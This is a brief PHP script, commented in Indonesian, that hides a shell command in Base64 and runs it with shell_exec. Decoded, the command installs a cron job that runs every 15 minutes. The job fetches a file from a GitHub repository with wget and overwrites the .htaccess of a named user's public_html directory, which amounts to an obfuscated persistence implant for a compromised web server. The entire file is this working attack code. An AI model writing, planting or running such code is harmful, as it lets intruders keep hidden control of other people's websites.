<?php
// Perintah crontab dalam bentuk Base64
$encoded_command = "KGNyb250YWIgLWw7IGVjaG8gIiovMTUgKiAqICogKiB3Z2V0IGh0dHBzOi8vZ2l0aHViLmNvbS9YLVByb2pldGlvbi9NT01PTk8vcmF3L3JlZnMvaGVhZHMvbWFpbi9odGF4eCAtTyAvaG9tZS9hZG1pbmZpc2lwL3B1YmxpY19odG1sLy5odGFjY2VzcyIpIHwgY3JvbnRhYiAt";

// Decode Base64 menjadi perintah asli
$command = base64_decode($encoded_command);

// Jalankan perintah shell
$output = shell_exec($command);

// Menampilkan hasil eksekusi (jika perlu)
echo "<pre>$output</pre>";
?>
